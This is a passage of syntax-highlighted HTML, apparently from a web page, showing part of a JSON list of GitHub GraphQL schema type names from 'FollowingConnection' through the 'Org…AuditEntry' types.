    &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;FollowingConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;FundingLink&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;FundingPlatform&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GenericHovercardContext&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Gist&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GistComment&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GistCommentConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GistCommentEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GistConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GistEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GistFile&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GistOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GistOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GistPrivacy&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GitActor&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GitActorConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GitActorEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GitHubMetadata&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GitObject&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GitObjectID&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GitSSHRemote&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GitSignature&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GitSignatureState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GitTimestamp&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GpgSignature&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GrantEnterpriseOrganizationsMigratorRoleInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GrantEnterpriseOrganizationsMigratorRolePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GrantMigratorRoleInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GrantMigratorRolePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;HTML&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;HeadRefDeletedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;HeadRefForcePushedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;HeadRefRestoredEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Hovercard&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;HovercardContext&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ID&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IdentityProviderConfigurationState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Int&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;InviteEnterpriseAdminInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;InviteEnterpriseAdminPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IpAllowListEnabledSettingValue&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IpAllowListEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IpAllowListEntryConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IpAllowListEntryEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IpAllowListEntryOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IpAllowListEntryOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IpAllowListForInstalledAppsEnabledSettingValue&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IpAllowListOwner&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Issue&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueComment&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueCommentConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueCommentEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueCommentOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueCommentOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueContributionsByRepository&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueFilters&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueOrPullRequest&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueTemplate&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueTimelineConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueTimelineItem&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueTimelineItemEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueTimelineItems&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueTimelineItemsConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueTimelineItemsEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueTimelineItemsItemType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;JoinedGitHubContribution&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Label&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;LabelConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;LabelEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;LabelOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;LabelOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Labelable&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;LabeledEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Language&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;LanguageConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;LanguageEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;LanguageOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;LanguageOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;License&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;LicenseRule&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;LinkRepositoryToProjectInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;LinkRepositoryToProjectPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;LockLockableInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;LockLockablePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;LockReason&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Lockable&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;LockedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Mannequin&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MarkDiscussionCommentAsAnswerInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MarkDiscussionCommentAsAnswerPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MarkFileAsViewedInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MarkFileAsViewedPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MarkPullRequestReadyForReviewInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MarkPullRequestReadyForReviewPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MarkedAsDuplicateEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MarketplaceCategory&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MarketplaceListing&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MarketplaceListingConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MarketplaceListingEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MemberStatusable&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MembersCanDeleteReposClearAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MembersCanDeleteReposDisableAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MembersCanDeleteReposEnableAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MentionedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MergeBranchInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MergeBranchPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MergePullRequestInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MergePullRequestPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MergeableState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MergedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Migration&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MigrationSource&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MigrationSourceType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MigrationState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Milestone&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MilestoneConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MilestoneEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MilestoneItem&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MilestoneOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MilestoneOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MilestoneState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MilestonedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Minimizable&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MinimizeCommentInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MinimizeCommentPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MoveProjectCardInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MoveProjectCardPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MoveProjectColumnInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MoveProjectColumnPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MovedColumnsInProjectEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Mutation&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Node&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;NotificationRestrictionSettingValue&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OIDCProvider&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OIDCProviderType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OauthApplicationAuditEntryData&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OauthApplicationCreateAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OauthApplicationCreateAuditEntryState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OperationType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrderDirection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgAddBillingManagerAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgAddMemberAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgAddMemberAuditEntryPermission&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgBlockUserAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgConfigDisableCollaboratorsOnlyAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgConfigEnableCollaboratorsOnlyAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgCreateAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgCreateAuditEntryBillingPlan&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgDisableOauthAppRestrictionsAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgDisableSamlAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgDisableTwoFactorRequirementAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgEnableOauthAppRestrictionsAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgEnableSamlAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgEnableTwoFactorRequirementAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgEnterpriseOwnerOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgEnterpriseOwnerOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgInviteMemberAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgInviteToBusinessAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgOauthAppAccessApprovedAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgOauthAppAccessDeniedAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgOauthAppAccessRequestedAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgRemoveBillingManagerAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgRemoveBillingManagerAuditEntryReason&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgRemoveMemberAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span 